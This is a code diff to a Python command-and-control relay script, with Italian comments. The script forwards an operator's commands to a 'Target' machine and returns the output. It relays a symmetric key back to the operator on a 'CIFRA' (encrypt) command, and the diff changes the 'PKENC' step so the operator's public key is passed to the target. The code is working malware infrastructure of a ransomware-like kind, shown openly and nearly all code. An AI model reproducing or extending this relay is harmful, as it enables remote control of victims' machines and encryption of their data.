@@ -19,7 +19,6 @@ print("[C&C] Connected to Target.")
 while True:
     # Riceve comando dall'operatore
     command = conn_operator.recv(1024)
-    print(f"[C&C] Command received: {command.decode().strip()}")
  
     # Invia il comando al Target
     s2.send(command)
@@ -29,12 +28,7 @@ while True:
         print("[C&C] Connection closing.")
         break
     
-    if command.decode().strip().upper().startswith("PKENC"):
-        pkey = s1.recv(1024)
-        s2.send(pkey)
-        
-        
-    # Riceve l'output e inoltra
+    # Riceve la chiave simmetrica e la inoltra all'Operatore
     if command.decode().strip().upper().startswith("CIFRA"):
         key_syn = s2.recv(1024)
         syn = key_syn.decode()
@@ -44,6 +38,13 @@ while True:
         ack_syn = ack.encode()
         conn_operator.sendall(ack_syn)
         conn_operator.sendall(symm_key)
+        
+    # Riceve la chiave pubblica asimmetrica e la inoltra al Target
+    if command.decode().strip().upper().startswith("PKENC"):
+        public_key = conn_operator.recv(4096)
+        if public_key is not None:
+            print("Key received.")
+        s2.send(public_key)    
         
     output = s2.recv(4096)
     conn_operator.sendall(output)
